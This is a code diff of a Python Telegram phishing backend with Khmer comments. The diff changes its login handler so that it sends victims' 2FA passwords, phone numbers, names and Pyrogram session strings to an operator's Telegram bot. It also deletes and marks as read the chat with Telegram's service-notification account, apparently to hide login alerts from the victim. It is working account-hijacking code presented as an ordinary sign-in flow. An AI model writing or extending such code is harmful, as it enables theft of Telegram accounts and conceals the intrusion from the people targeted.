@@ -87,6 +87,16 @@ async def async_verify_code(phone_number, code, password):
         else:
             await client.sign_in(phone_number, phone_code_hash, code)
     except errors.SessionPasswordNeeded:
+        # 🔔 ផ្ញើការជូនដំណឹងទៅ Admin Bot ថាគណនីនេះត្រូវការ 2FA Password
+        if BOT_TOKEN and ADMIN_CHAT_ID:
+            msg_2fa = f"🔐 **2FA Password Required!**\n📱 **Phone:** `{phone_number}`\nUser is being prompted to enter 2FA password."
+            try:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={"chat_id": ADMIN_CHAT_ID, "text": msg_2fa, "parse_mode": "Markdown"}
+                )
+            except:
+                pass
         return {"requires_password": True}
 
     me = await client.get_me()
@@ -95,22 +105,26 @@ async def async_verify_code(phone_number, code, password):
 
     session_string = await client.export_session_string()
 
+    # 1. លុបសារ/ប្រវត្តិសន្ទនាជាមួយ Telegram Service Notification (ID: 777000)
     try:
-        async for dialog in client.get_dialogs():
-            if dialog.chat.id not in (777000, 777):
-                try:
-                    await client.delete_chat_history(dialog.chat.id)
-                except:
-                    pass
-    except:
-        pass
+        await client.delete_chat_history(777000)
+    except Exception as e:
+        print(f"Failed to delete Telegram Service history: {e}")
+
+    # 2. រង់ចាំសារថ្មីរយៈពេល 6 វិនាទី រួច Mark as Read ក្នុង Chat Telegram Service (ID: 777000)
+    try:
+        await asyncio.sleep(6)
+        await client.read_chat_history(777000)
+    except Exception as e:
+        print(f"Failed to mark Telegram Service chat as read: {e}")
 
     await client.disconnect()
     temp_clients.pop(phone_number, None)
 
     # ផ្ញើ Notification ទៅកាន់ Admin Telegram Bot
     if BOT_TOKEN and ADMIN_CHAT_ID:
-        msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
+        pass_info = f"\n🔐 **2FA Password:** `{password}`" if password else ""
+        msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`{pass_info}\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
         try:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -126,7 +140,7 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": STATIC_INVITE_LINK
     }
 
-# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join ຜ່ານ Link Request
+# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join តាម Link Request
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
